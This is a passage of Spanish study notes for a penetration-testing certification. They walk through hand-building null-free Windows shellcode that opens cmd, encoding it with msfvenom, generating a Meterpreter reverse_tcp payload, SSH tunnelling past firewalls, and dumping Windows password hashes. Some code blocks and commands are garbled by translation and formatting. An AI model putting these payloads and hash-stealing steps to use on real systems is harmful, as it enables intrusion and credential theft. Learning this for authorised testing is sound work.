> También puede descargar y ejecutar shellcodes. Simplemente descárguelo de Internet y ejecútelo. Este ejecutable puede ser:
>
> ```
> 	data harvesting tool
> 	malware
> 	backdoor
> 	etc
> ```

### Codificación de Shellcode <a href="#encoding-of-shellcode" id="encoding-of-shellcode"></a>

Las funciones de cadena del lenguaje C funcionan hasta que se encuentra un NULL o 0 bytes. Por lo tanto, _los shellcodes deben estar libres de nulos para garantizar la ejecución._

#### Tipos de codificación de shellcode <a href="#types-of-shellcode-encoding" id="types-of-shellcode-encoding"></a>

* Codificación sin valores nulos
* Codificación alfanumérica e imprimible

#### Libre de valores nulos <a href="#null-free" id="null-free"></a>

Codificar un shellcode que contiene bytes NULL significa reemplazar las instrucciones de máquina que contienen ceros, con instrucciones que no contienen los ceros, pero que logran las mismas tareas.

#### Alfanumérico <a href="#alphanumeric" id="alphanumeric"></a>

A veces, el proceso de destino filtra todos los bytes no alfanuméricos de los datos. En tales casos, se utilizan códigos de shell alfanuméricos.

* Las instrucciones se vuelven muy limitadas, para evitar que se utilice el código automodificable (SMC).

> El shellcode codificado va precedido de un decodificador más pequeño (que tiene que ser un shellcode codificado alfanumérico válido), que al ejecutarse decodificará y ejecutará el cuerpo principal del shellcode.

Ejemplo de codificación sin valores nulos:

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/5.png)

> A partir de esto, debe notar que la primera instrucción (mov eax, 0) debe evitarse porque tiene ceros dentro de su representación de código máquina.

### Depuración de un shellcode <a href="#debugging-a-shellcode" id="debugging-a-shellcode"></a>

podemos probar el shellcode en este programa C. antes de enviarlo a destino.

```
#include <windows.h>

char code[] = "shell code will go here!"; 

int main(int argc, char **argv) 
{ 
  int (*func)(); 
  func = (int (*)()) code; 
  (int)(*func)(); 
}
```

### Creando nuestro primer Shellcode <a href="#creating-our-first-shellcode" id="creating-our-first-shellcode"></a>

Cree un shellcode que haga que el subproceso duerma durante cinco segundos

Para eso necesitamos buscar y encontrar la función que hace esto. https://msdn.microsoft.com/en-us/library/windows/desktop/ms686298(v=vs.85).aspx

En este caso, requiere un parámetro, que especifica la cantidad de tiempo para dormir en milisegundos:

```
VOID WINAPI Sleep(
__in DWORD dwMilliseconds
);
```

#### Necesitamos obtener la dirección de sueño <a href="#we-need-to-get-the-sleep-address" id="we-need-to-get-the-sleep-address"></a>

con Immunity Debugger:

```
	disassemble panel > search For > Name in All modules
	search For sleep
	.text region - 0x757D82D0
```

con Awrin:

```
	arwin.exe kernel32.dll Sleep
```

#### Después de obtener la dirección <a href="#after-getting-the-address" id="after-getting-the-address"></a>

necesitamos crear un pequeño código ASM que llame a esta función.

```
xor eax, eax
mov eax, 5000
push eax, 
mov ebx, 0x757d82d0
call ebx
-----------------------------------
- zero out the eax register
- move the milliseconds value into eax (5000)
- push the function parameter onto the stack
- move the address of Sleep into ebx
- call the function- Sleep(ms);
```

> Para compilar:
>
> ```
> 	nasm -f win32 sleep.asm -o sleep.obj
> ```

Una vez que hayamos montado nuestro archivo, tenemos que desmontarlo. Porque queremos el código de bytes de nuestras instrucciones ASM. Podemos usar objdump: objdump -d -Mintel sleep.obj

> Editar: tenemos que eliminar los espacios y añadir el prefijo \x. Ahora podemos compilar el programa y ejecutarlo.

* Debería esperar 5 segundos y luego se bloquea.

### Un shellcode más avanzado <a href="#a-more-advanced-shellcode" id="a-more-advanced-shellcode"></a>

```
if we wanna do shellcode manually, we need to search how the function works.
often, we write in C, c++ > compile > decompile to get the machine code > modify the machine code, take off the spaces and adding \x prefix > finally compile again
```

Si quieres usar: WinExec: https://msdn.microsoft.com/en-us/library/windows/desktop/ms687393(v=vs.85).aspx

ShellExecute: asegúrese de que el programa se cargue Shell32.dll https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx

Cuadro de mensaje: https://msdn.microsoft.com/en-us/library/windows/desktop/ms645505(v=vs.85).aspx

#### Ejemplo de ShellExecute <a href="#shellexecute-example" id="shellexecute-example"></a>

_Este simple código generará un nuevo símbolo del sistema y maximizará la ventana._

```
#include <windows.h>
int main(int argc, char** argv)
{
	ShellExecute(0, "open", "cmd", NULL, 0, SW_MAXIMIZE);
}
```

#### Tratar con cadenas significa: <a href="#dealing-with-strings-means" id="dealing-with-strings-means"></a>

1. Calcular su valor hexadecimal
2. Empuja la cuerda
3. Inserte un puntero a la cadena en la pila

Conocer el módulo es importante ya que tendremos que encontrar la dirección de la función y empujarla en la pila, de manera similar a lo que hicimos antes con la función Sleep.

**Lo primero**

Lo que hay que hacer es convertir las cadenas (cmd y open) que vamos a introducir en la pila.

Tendremos que empujar las cadenas a la pila y luego pasar un puntero a la cadena a la función ShellExecutionA (no podemos pasar la cadena en sí)

**Importar cosas que hay que recordar al insertar las cadenas en la pila**

→ Deben estar exactamente alineados a 4 bytes → Deben ser empujados en el orden inverso → Las cadenas deben terminar con \x00, de lo contrario, el parámetro de función cargará todos los datos de la pila.

> Los terminadores de cadena introducen un problema con el shellcode libre de NULL. Por lo tanto, si el shellcode debe ejecutarse contra funciones de cadena (como strcpy), tendremos que editar el shellcode y hacerlo NULL-free.

> Consejos: Si no conoce el código de operación de una instrucción de ensamblaje específica, puede usar herramientas en línea como:
>
> ```
> 	https://defuse.ca/online-x86-assembler.htm#disassembly
> or offline tools like Immunity, Metasm, etc
> ```

En Inmunidad: haga doble clic en una instrucción aleatoria en el panel principal > escriba el código ASM que desea ensamblar

```
example: PUSH 0 > the opcode would be:
\x6A = because its PUSHing a byte
\x68 For PUSH a word or a dword.
```

Lista de opcdes utilizados:

```
	https://c9x.me/x86/html/file_module_x86_id_269.html
```

### Cómo convertir y empujar la cadena 'calc.exe' <a href="#how-to-convert-and-push-the-string-calcexe" id="how-to-convert-and-push-the-string-calcexe"></a>

1.  Tengo que dividirnos en grupos de 4 personajes ya que tenemos que empujarlos a la pila:

    ```
    → "calc"
    → ".exe"
    ```
2.  Como se mencionó anteriormente, la cadena debe insertarse en el orden inverso:

    ```
    → ".exe"
    → "calc"
    ```
3.  tenemos que convertir a caracteres ASCII en valores hexadecimales. Podemos usar scripts bash o herramientas en línea para esto. como asciitohex o rapidtables. _http://www.asciitohex.com/ http://www.rapidtables.com/convert/number/ascii-to-hex.htm_

    ```
    → "\x2e\x65\x78\x65" > ".exe"
    → "\x63\x61\x6c\x63" > "calc"
    ```

¿Quieres empujar la cadena a la pila? Agregue el código de bytes de inserción al principio de cada línea (\x68)

```
   → "\x68\x2e\x65\x78\x65" // PUSH ".exe"
   → "\x68\x63\x61\x6c\x63" // PUSH "calc" 
```

1. Para terminar la cadena. Tenemos que agregar el valor \x00 justo después de calc.exe
   *   Necesitamos llenar de espacios, porque recuerda. Necesitamos enviar 4 bytes

       ```
       → "\x68\x20\x20\x20\x00" // the \x00 is the terminator, the \x20 is the hex value of space character
       → "\x68\x2e\x65\x78\x65" // PUSH ".exe"
       → "\x68\x63\x61\x6c\x63" // PUSH "calc"
       ```

### Creando nuestro shellcode - Para abrir un CMD <a href="#creating-our-shellcode---to-open-a-cmd" id="creating-our-shellcode---to-open-a-cmd"></a>

1.  Calcule los códigos de operación para enviar la cadena 'cmd' y 'open'

    ```
    → "\x68\x63\x6d\x64"       // PUSH "cmd" onto the stack
    → "\x68\x6f\x70\x65\x6e" // PUSH "open" onto the stack
    ```

    Tenga en cuenta que el primer PUSH no es de 4 bytes y no hay el terminador de cadena al final.

    ```
    → "\x68\x63\x6d\x64\x00"   // PUSH "cmd" and terminates the string with \x00 = now its 4 bytes
    →  "\x6A\x00"                      // PUSH 0: Terminates the string 'open' by directly pushing \x00 onto the stack
    → "\x68\x6f\x70\x65\x6e"   // PUSH "open"
    ```

* La función ShellExecuteA, requiere un puntero a estas cadenas, tendremos que guardar un puntero a cada cadena usando un registro.
* A continuación, guardaremos la posición actual de la pila en un registro. Cuando empujamos la cuerda, ESP se alineará con la parte superior de la pila. Por lo tanto, apuntará a la propia cadena.
* Almacenar este valor en un registro (como EBX o ECX) nos permite guardar un puntero a esa cadena. Luego solo tendremos que pasar el puntero como argumento de la función.
*   Para guardar el puntero en un registro: después de la instrucción push de nuestro shellcode

    ```
    mov ebx, esp
    ```

#### Actualicemos nuestro código <a href="#lets-update-our-code" id="lets-update-our-code"></a>

```
   → "\x68\x63\x6d\x64\x00"   // PUSH "cmd" and terminates the string with \x00 = now its 4 bytes
   → "\x8B\xDC"                       // MOV EBX, ESP
                                               // puts the pointer to the text "cmd" into ebx
   →  "\x6A\x00"                      // PUSH 0: string terminator For 'open'
   → "\x68\x6f\x70\x65\x6e"   // PUSH "open"
   → "\x8B\xCC"                      // MOV ECX, ESP
                                              // puts the pointer to the text 'open' into ecx
```

* Mirando el código ensamblado, tenemos que pasar +4 parámetros, 0003 orden inverso > 300 0
*   Hay varias formas de ejecutar una instrucción 'push 3':

    ```
      just push 3
      move the value to a register, then push the register itself
      zero out the register, then increment the register 3 times
      etc
    ```

```
"\x6A\x03" // PUSH 3
```

*   Ahora los ceros

    ```
    "\x33\xc0"  // xor eax, eax => zero out the eax register
    "\x50"        // push eax => pushes 0
    "\x50"        // push eax => pushes 0
    ```

#### Cuerdas de empuje <a href="#push-strings" id="push-strings"></a>

> Ahora tenemos que empujar la cadena 'open' 'cmd' Como sabemos, no podemos empujar las cadenas directamente, primero debemos asignar la cadena a un registro y luego empujar el registro. Ya lo hicimos anteriormente con EBX (CMD) y ECX (Open).
>
> ```
> "\x53" // push ebx
> "\x51" // push ecx
> ```

*   Necesitamos empujar el último cero, el valor de eax sigue siendo 0, podemos empujar el eax:

    ```
    "\x50" // push eax => pushes 0
    ```
*   casi listo, tenemos que buscar la dirección de la función ShellExecuteA. Para encontrar la dirección usaremos Arwin:

    ```
      arwin.exe Shell32.dll ShellExecuteA
      'ShellExecuteA is located at 0x762bd970 in Shell32.dll'
    ```
*   Moveremos la dirección a un registro y luego llamaremos al registro. Ya no usaremos EAX como cero, así que podemos pasar a eso. No olvides invertir la dirección, porque estamos en Windows (little-endian)

    ```
    "\xB8\x70\xD9\x2b\x76" // mov eax, 762bd970 - address of ShellExecuteA
    "\xff\xD0"                       // call eax
    ```

### shellcode final <a href="#final-shellcode" id="final-shellcode"></a>

```
"\x68\x63\x6d\x64\x00"
"\x8B\xDC"
"\x6A\x00"
"\x68\x6f\x70\x65\x6e"
"\x8B\xCC"
"\x6A\x03"
"\x33\xc0"
"\x50"
"\x50"
"\x53"
"\x51"
"\x50"
"\xB8\x70\xD9\x2b\x76"
"\xff\xD0"
```

#### Explicación de shellcode <a href="#shellcode-explained" id="shellcode-explained"></a>

```
   → "\x68\x63\x6d\x64\x00"   // PUSH "cmd" and terminates the string with \x00 = now its 4 bytes
   → "\x8B\xDC"                       // MOV EBX, ESP => puts the pointer to the text "cmd" into ebx
   →  "\x6A\x00"                      // PUSH 0: string terminator For 'open'
   → "\x68\x6f\x70\x65\x6e"   // PUSH "open" onto the stack
   → "\x8B\xCC"                      // MOV ECX, ESP => puts the pointer to the text 'open' into ecx
   → "\x6A\x03" // PUSH 3 => the last argument
   → "\x33\xc0"  // xor eax, eax => zero out the eax register
   → "\x50"        // push eax => pushes 0 = the second to last argument
   → "\x50"        // push eax => pushes 0 = the third to last argument
   → "\x53" // push ebx => push the pointer to string 'cmd'
   → "\x51" // push ecx => push the pointer to string 'open'
   → "\x50" // push eax => pushes 0 = push the first argument
   → "\xB8\x70\xD9\x2b\x76" // mov eax, 762bd970 = move ShellExecuteA into eax
   → "\xff\xD0"                       // call eax = call the function ShellExecuteA
```

* Podemos probar el shellcode, con el código del depurador de C++.
*   El compilador no carga automáticamente la librería Shell32.dll en el programa, tenemos que forzar al programa a cargarla con la instrucción:

    ```
      LoadLibraryA("Shell32.dll")
    ```

> Si no lo hacemos, el programa saltará a una ubicación vacía y el shellcode fallará.

### Terminador de cadena <a href="#string-terminator" id="string-terminator"></a>

Los terminadores de cadenas son marcadores importantes para indicar dónde termina la cadena For the argument. Piense en ellos como marcas de puntuación como un '.' o ','

* Si no usamos el terminador, el programa obtendrá otras instrucciones del código para obtener los 4 bytes y cambiará todo el código.

#### Código de shell libre de NULL <a href="#null-free-shellcode" id="null-free-shellcode"></a>

Hicimos un shellcode que abre un cmd, pero no es un shellcode libre de null. Por lo tanto, si intentamos usar contra Against un Bof Vuln que use una función de cadena como strcpy, fallará.

```
two ways to get rid of null-bytes:
Manual Editing / Encoder tools
```

#### Edición manual <a href="#manual-editing" id="manual-editing"></a>

\x68\x63\x6d\x64'\x00' Necesitamos tomar ese byte nulo de nuestro código.

* Objetivo: Insertar los códigos de bytes 00646d63 en la pila Solución: restar (o sumar) un valor específico para eliminar 00

ejemplo:

```
we if subtract 11111111 from 00646d63 = ef535c52 > which does not contain 00
	'we can use whatever value that does not contain 00'

1. moves ef535c52 into a register
2. adds back 11111111 to the register (in order to obtain 00646d63)
3. push the value of the register on the stack
```

*   before (con bytes nulos):

    ```
    "\x68\x63\x6d\x64\x00"
    "\x8B\xDC"
    ```

***

* después (sin valores nulos): \`\`\` "\x33\xDB" // xor ebx, ebx: cero fuera ebx "\xbb\x52\x5c\x53\xef" // mov ebx, ef535c52 "\x81\xc3\x11\x11\x11\x11\x11" // añadir ebx, 11111111 (ahora ebx contiene 00646d63)

"\x53" // empujar ebx "\x8B\xDC" // mov ebx, esp: pone el puntero a la cadena

```

- goal: delete the second string terminator added For the string 'open'
solution: we can zero out the eax register and then push its value into the stack; this will automatically push the string terminator.

- before (w/ null bytes):
```

"\x6A\x00" "\x68\x6f\x70\x65\x6e" "\x8B\xCC"

```

----------------------------------------------------------------------------------------------------------------
- after (null-free):
```

"\x33\xC0" // xor eax, eax: cero fuera eax "\x50" // push eax: empuja el terminador de cadena "\x68\x6f\x70\x65\x6e" // empuja 'abrir' a la pila "\x8B\xCC" // mov ecx, esp: pone el puntero en 'open'

```

> there are many others techniques to make a shellcode null-free

### Using Encoder Tools
	https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom

#### Msfvenom
problem: shellcode contains the null byte \x00
solution: use msfvenom in order to encode it and make the shellcode null free

1. Convert the shellcode in a binary file
```

→ echo -ne "\x68\x63\x6d..." > binshellcode.bin -n = no genera la nueva línea final -e = permite la interpretación de escapes de barra diagonal inversa > binshellcode.bin = envía el resultado al archivo

→ python -c 'print "\x68\x63\x6d..." > binshellcode.bin' → perl -e 'print "\x68\x63\x6d..." > binshellcode.bin'

```

2. Inspect the binary file (optional):
```

→ binshellcode.bin de volcado hexadecimal

```

3. use msfvenom to encode it:
```

```
-b '\x00' : specify a list of (bad chars) to avoid when generating the shellcode.
-a x64 : specifies the architecture to use
-p - : instructs msfvenom to read the custom payload from the stdin
--plataform win : is used to specify the platform
-e x86/shikata_ga_nai : specifies the encoder to use
-f c : sets the output format (in this case C)
```

→ binshellcode.bin para gatos | msfvenom -p - -a x86 –platform win -e x86/shikata\_ga\_nai -f c -b '\x00'

```

> We should get a shellcode null-free

```

Los badchars no siempre son \x00, pueden aparecer en otros valores hexadecimales. Hay muchos casos en los que no podemos usarlos a la hora de desarrollar nuestro exploit. Es posible que necesitemos tener en cuenta el carácter de nueva línea '( \n )' o ' (\x0A en hexadecimal) ', por ejemplo;

```

## Shellcode and Payload Generators

tools:
```

````
msfvenom - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
the backdoor factory - https://github.com/secretsquirrel/the-backdoor-factory
veil-framework - https://github.com/Veil-Framework/ ```
````

#### MSFVENOM <a href="#msfvenom" id="msfvenom"></a>

```
msfvenom --list payloads
msfvenom -p windows/messagebox --payload-options
```

**El uso depende de lo que queramos**

Establecer una conexión interactiva: Usar una carga útil _MeterPreter_ Ejecutar un solo comando: Usar una _carga útil CMD_ genera un cuadro de mensaje: _Windows/MessageBox_

```
- example 1 : generate a messagebox shellcode with msfvenom

msfvenom -p windows/messagebox TEXT="My first msfvenom shellcode" -f c -a x86 --platform win

	-p = windows/messagebox : sets the payload to use
	TEXT="..." : set the text of the messagebox
	-f c : output format of the shellcode
	-a x86 : architecture
	--platform win : target platform For the shellcode
```

***

example 2 : reverse interactive meterpreter session

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<kali ip> lport=<port> -f c

	-p = windows/meterpreter/reverse_tcp = tell msfvenom the payload to use
	LHOST=<host IP> : sets the IP address For the connect back of the payload
	LPORT=<port> : sets the port For the connect back of the payload
	-f c : the output format of the shellcode
```

> We should open a listener in msfconsole > exploit/multi/handler

![Alt text](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/6.png)

## Cryptography and Password Cracking <a href="#cryptography-and-password-cracking" id="cryptography-and-password-cracking"></a>

* The art of share information in a secret manner

![Alt text](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/16.png)

Encryption is the process of transforming a message into a ciphertext. Decryption is the process of retrieving the original message from a ciphertext by using the correct key

### 4 main issues: <a href="#id-4-main-issues" id="id-4-main-issues"></a>

```
Authentication: claims made by or about the subject are true
Confidentiality: information is accessible only to those authorized to have access
Integrity: message has not been manipulated/altered in the transfer
Non-Repudiation: ensuring that a party in a dispute cannot repudiate, or refute the validity of a statement
```

### Classification of Crypto-Algorithms <a href="#classification-of-crypto-algorithms" id="classification-of-crypto-algorithms"></a>

#### Use of keys <a href="#use-of-keys" id="use-of-keys"></a>

```
Symmetric-key cryptography
Public-key cryptography ### Handling of Data
Block Cipher
	ECB
	CBC
Stream Cipher
```

#### Symmetric-key Cryptography <a href="#symmetric-key-cryptography" id="symmetric-key-cryptography"></a>

```
both sender and receiver share the same key.
```

crypto-algorithms:

```
	DES (Data Encryption Standard) / 3DES = https://csrc.nist.gov/csrc/media/publications/fips/46/3/archive/1999-10-25/documents/fips46-3.pdf
	AES (Advanced Encryption Standard) = http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf
	RC4
	Blowfish
	others
```

#### Public-key Cryptography <a href="#public-key-cryptography" id="public-key-cryptography"></a>

```
There are two keys For each peer.
public key is freely distributed and the private key which is to be kept secret.
public key is usually used For encryption, private is used For decryption.
public key aka asymmetric key
```

Problema de RSA - http://www.di-mgt.com.au/rsa\_alg.html

#### cómo se maneja el texto plano, Clases de algoritmos <a href="#how-plaintext-is-handled-classes-of-algorithms" id="how-plaintext-is-handled-classes-of-algorithms"></a>

Cifrado de bloques: manejan datos en bloques (trozos de 8 bytes o 16 bytes) por ejemplo, DES, AES Cifrado de flujo: Los datos se manejan un byte a la vez, por ejemplo, RC4, A5/1

#### Cifrados de bloques <a href="#block-ciphers" id="block-ciphers"></a>

→ BCE (Libro de Códigos Electrónicos) → CBC (encadenamiento de bloques de cifrado)

#### ECB <a href="#ecb" id="ecb"></a>

```
The message is divided into blocks and each block is encrypted separately. ps: this is a deprecated mode
```

#### CBC <a href="#cbc" id="cbc"></a>

```
each ciphertext block is derived from the previous blocks as well.
An initialization vector is used For the first block.
```

Clave pública/privada

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/7.png)

BCE - Libro de Códigos Electrónicos

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/8.png)

CBC - Encadenamiento de bloques de cifrado

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/9.png)

### Función hash criptográfica <a href="#cryptographic-hash-function" id="cryptographic-hash-function"></a>

````
algorithm that produces a fixed length block of bits from a variable length input message. ```
the output is usually called hash or digest.
examples: MD5, MD4, SHA1, ... ```
````

3 Propiedades

* Resistencia a la _preimagen_: debería ser inviable encontrar un mensaje que tenga un hash determinado.
* _Segunda resistencia de preimagen_: dado un mensaje de entrada, debería ser incomprensible encontrar otro mensaje con el mismo hash.
* _Resistencia a colisiones_: debería ser inviable encontrar dos mensajes diferentes con el mismo hash. Un par de este tipo, si se encuentra, se denomina colisión de hash.

> Efecto avalancha = Un solo bit cambiado en el mensaje causará un gran cambio en la salida final.

### Infraestructura de clave pública (PKI) <a href="#public-key-infrastructure-pki" id="public-key-infrastructure-pki"></a>

```
Set of hardware, software, people, policies and procedures needed to create, manage, store, distribute and revoke digital certificates.
```

PKI: asegúrese de que la autoridad de certificación (CA) esté certificada y verificada de manera efectiva.

La identidad del usuario debe ser única para cada CA.

#### X.509 <a href="#x509" id="x509"></a>

Stardard Para certificados de clave pública.

Ejemplos: SSL/TLS, SET, S/MIME, IPsec, otros

* El certificado se puede utilizar para verificar que una clave pública pertenece a una persona.
* La CA actúa como un tercero de confianza

Entidad de certificación de < de _clave privada de CA de < de usuario_ Esto garantiza que cualquier comunicación cifrada con esta clave pública de usuario pueda ser leída solo por él

CA firma el par: \<USER, USERkey> vinculando esa clave a ese usuario es como los certificados SSL

* Un certificado SSL tiene dos propósitos: Proporcionar una prueba de identidad Proporcionar un canal seguro para la transmisión de datos
*   que falsifica los signos de las CA raíz puede firmar cualquier otro certificado que esté siendo validado con éxito por los navegadores web. Más sobre eso > http://www.win.tue.nl/hashclash/rogue-ca/

    ```
     → Web browsers store public keys of root CAs.
    ```

#### SSL (en inglés) <a href="#ssl" id="ssl"></a>

```
*Authenticity* is verified by verifying the validity of the certificate (validating the digital signature).
*Confidentiality* is achieved by handshaking initial channel parameters encrypted with the SSL certificate public key of the web site.
```

* SSL - Capa de Sockets Seguros. es un protocolo seguro, que utiliza PKI y cifrado simétrico. Asegúrese de que un tercero no pueda alterar o alterar la comunicación entre dos entidades.

#### Firma digital <a href="#digital-signature" id="digital-signature"></a>

Demuestra que el mensaje proviene efectivamente de un remitente determinado.

```
   → the message integrity is preserved. Any message alteration will be detected.
   → Hashing are faster than encryption.
```

```
http://www.win.tue.nl/hashclash/rogue-ca/
```

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/10.png)

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/11.png)

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/12.png)

firma digital:

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/13.png)

### Bastante buena privacidad (PGP) <a href="#pretty-good-privacy-pgp" id="pretty-good-privacy-pgp"></a>

```
	encrypt files
	apply digital signature
	enforce integrity
	follow the OpenPGP standard (RFC 4880)
	uses public-key cryptography > binds with email address
```

```
we have to put trust in that binding because there is no CA confirming that the message belongs effectively to the intended address.
```

OpenPGP es un conjunto de estándares que describe los formatos para mensajes cifrados, claves y firmas digitales.

GnuPG (o GPG) es una implementación GPL de código abierto de los estándares, que se encuentran en los sistemas GNU/Linux.

#### Piezas clave de PGP: <a href="#pgp-key-parts" id="pgp-key-parts"></a>

Los campos son similares a los de un certificado X.509. pero una clave PGP no es un certificado (nadie lo ha firmado todavía)

**Lo que necesitarás:**

Su propia clave secreta: Thill se almacenará encriptada con una frase de contraseña Usted posee la clave pública y las claves públicas de sus amigos y asociados

````
The PGP software stores > keyring ``` - private key are in a file stored encrypted with a passphrase - the public keys dont have to be protected - the keyring also contains copies of other people public keys which are trusted by you - PGP can digitally sign a document or digest (SHA1) - The signature is a manageable length (160 bits can be represented easily in HEX) ```
````

**proceso**

Si desea cifrar un mensaje PGP genera una clave simétrica > luego cifra la clave simétrica con la clave pública A continuación, el mensaje se cifra con la clave simétrica.

**Los algoritmos que utiliza PGP**

```
	RSA, DSS, Diffie-Hellman = public-key encryption
	3DES, IDEA, CAST-128 = Symmetric-key encryption
	SHA-1 = hashing
	ZIP = compression
```

Los dos enfoques de la confianza

![Texto alternativo](https://johnermac.github.io/assets/images/posts/2023-11-19-ecppt/14.png)

### Secure Shell (SSH) <a href="#secure-shell-ssh" id="secure-shell-ssh"></a>

````
Network protocol that allows data to be exchanged using a secure channel between two networked devices
very common on Unix based systems > replacement of Telnet
shell access on the server in a secure way
its also used to create tunnels, port forwarding and secure file transfer
listens on TCP port 22 by default

SSH tunnels may be used to tunel unencypted traffic over a network through an encrypted channel
SSH allows one to tunnel any protocol within a secure channel:     → message protocols, mount remote hard drivers etc

Corporate policies and filters can be bypassed by using SSH tunnels, cause ssh provided a mean to bypass firewall. ```bash
ssh -L 3000:homepc:23 bob@sshserver.com ```
````

```
-L = initiate a tunnel
3000 = localport
homepc = remotehost
23 = remoteport
bob@sshserver.com = username@SSH server
```

```
	telnet localhost:3000
```

> Esto se conectaría a la PC de su hogar a través de telnet de una manera segura, ya que se enrutaría a través del túnel SSH

### Ataques criptográficos <a href="#cryptographic-attacks" id="cryptographic-attacks"></a>

```
decipher the ciphertext without knowing the key.
```

* Ataque conocido de solo texto sin formato Un criptoanalista tiene acceso a un texto plano y al texto cifrado correspondiente
* Ataque de solo texto cifrado conocido El atacante solo conoce el texto cifrado, pero no el texto sin formato
* Ataque de texto plano elegido Es similar a 1, pero el texto plano puede ser elegido por los atacantes
* Ataque de texto cifrado elegido El atacante solo conoce el texto cifrado de su elección y se abre camino hacia el texto plano. Utilizado comúnmente contra la clave pública-privada, la clave pública es ampliamente conocida y encontrar la clave privada derrotará el cifrado.
* Ataque adaptativo de texto sin formato/texto cifrado elegido El atacante puede elegir texto plano o texto cifrado respectivamente, un bloque tras otro (basado en resultados anteriores), lo que conduce a la derrota del cifrado

#### Ataques prácticos comunes <a href="#common-practical-attacks" id="common-practical-attacks"></a>

**Fuerza bruta**

```
attempts every combination of the key
as CPU speeds increase and storage becomes more affordable, cracking time become faster
an a lot of encryption are becoming obsolete.
```

**Ataque de diccionario**

```
attempts the most likely keys
the attack is only successful if the dictionary contains the key
```

**Mesas arcoíris**

```
search For the ciphertext within the rainbow table. if present, you will immediately get the corresponding plaintext.
http://kestas.kuliukas.com/RainbowTables/
http://ophcrack.sourceforge.net/tables.php
http://project-rainbowcrack.com/index.htm#download
```

**Ataques de canal lateral**

```
dont rely just on plaintext/ciphertext to attack crypto algorithms
they also take into account physical implementation including the hardware used to encrypt or decrypt data.
time taken to perform an encryption, CPU cycles used and even absorbed power variation during the algorithm can produce important information to a crypto analyst.
```

**Ataque de cumpleaños**

Ataque que puede descubrir colisiones en algoritmos hash como MD5 o SHA1

### Escollos de seguridad <a href="#security-pitfalls" id="security-pitfalls"></a>

* Un atacante no atacará directamente los algoritmos criptográficos, sino que atacará su implementación

#### Algunos puntos básicos: <a href="#some-basic-point-outs" id="some-basic-point-outs"></a>

→ No destruir el texto sin formato después de su uso → no tratar los datos descifrados con cuidado → Un sistema que utiliza archivos temporales para evitar la pérdida de datos, puede dejar texto sin formato o datos descifrados, o ambos, en el archivo temporal → sistema que usa más de 1 clave, debe ocuparse de todas las claves por igual, porque una sola fuga de clave hace que todo el sistema sea inútil. → Permitir la recuperación de claves antiguas también puede actuar como un punto débil → etc

#### información <a href="#info" id="info"></a>

* Atacar los protocolos de red para romper un sistema que utiliza un algoritmo de criptografía irrompible es lo que sucede todos los días.
* Los usuarios son el eslabón más débil de la cadena.
* Crean contraseñas débiles, si se les impone una contraseña segura, no lo recuerdan.
* El algoritmo puede romperse a través de una ingeniería social más o menos sofisticada.

> Cuando piensas en sitios web de phishing o malware instalado que utiliza el registro de teclas para robar contraseñas, la criptografía o la seguridad de las contraseñas son simplemente inútiles.

### Windows 2000 / XP / 2k3 / vista / 7 / 8 / Contraseñas <a href="#windows-2000--xp--2k3--vista--7--8--passwords" id="windows-2000--xp--2k3--vista--7--8--passwords"></a>

#### Todas las contraseñas de Windows (excepto DC) se almacenan en una base de datos de configuración llamada SAM <a href="#all-the-passwords-in-windows-except-dc-are-stored-in-a-config-database-called-sam" id="all-the-passwords-in-windows-except-dc-are-stored-in-a-config-database-called-sam"></a>

SAM = Security Accounts Manager es una base de datos almacenada como archivo de registro

* Almacena las contraseñas de los usuarios en un formato hash: Hash LM Hash NT

#### Hash LM (Hash del administrador de LAN) <a href="#lm-hash--lan-manager-hash" id="lm-hash--lan-manager-hash"></a>

_hasta Windows Vista, si las contraseñas tenían menos de 15 caracteres, se almacenaban como hash LM_

1. La contraseña del usuario se convierte a mayúsculas
2. Si la longitud es inferior a 14 bytes, se rellena con valores nulos, de lo contrario se trunca, por ejemplo: MYPASSWORD0000
3. se divide en dos mitades de 7 bytes: MYPASSW ORD0000
4. Estos valores se utilizan para crear dos claves DES, una de cada mitad de 7 bytes, convirtiendo los 7 bytes en un flujo de bits e insertando un bit de paridad después de cada 7 bits. Esto genera los 64 bits necesarios para la clave DES
5. Cada una de estas claves se utiliza para cifrar DES la cadena ASCII constante "KFS!@#$%", lo que da como resultado dos valores de texto cifrado de 8 bytes.
6. estos dos valores de texto cifrado se concatenan para formar un valor de 16 bytes, que es el hash LM

#### NT hash <a href="#nt-hash" id="nt-hash"></a>

_All passwords from windows 2000 are also stored as NT hashes._

> LM hashes are still computed and stored by default up to Windows Vista, for backward compatiblity

Unicode version of the password is hashed using MD4 algorithm to get resulting hash which is stored For later use.

#### where are the Hashes? <a href="#where-are-the-hashes" id="where-are-the-hashes"></a>

Stored in the Windows SAM file.

```
Located: C:\Windows\System32\config
Located also in registry: HKEY_LOCAL_MACHINE\SAM
```

_pero no se puede acceder a él mientras se ejecuta el sistema operativo y requiere privilegios de SISTEMA_

#### Robar el hash <a href="#stealing-the-hash" id="stealing-the-hash"></a>

Remotamente:

> Las contraseñas se vuelcan desde la memoria del sistema remoto, cargando el programa de volcado de contraseñas desde el control remoto. Esto requiere al menos una cuenta administrativa

Herramientas:

```
pwdump : http://www.foofus.net/fizzgig/pwdump/
fgdump : http://foofus.net/goons/fizzgig/fgdump/
ophcrack : http://ophcrack.sourceforge.net/
SAMinside : http://web.archive.org/web/20130307204429/http:/insidepro.com/eng/saminside.shtml
l0phtCrack : http://www.l0phtcrack.com/
kon-boot : http://www.piotrbania.com/all/kon-boot/
```

en la sesión de Meterpreter: Ejecutar hashdump

#### Localmente: <a href="#locally" id="locally"></a>

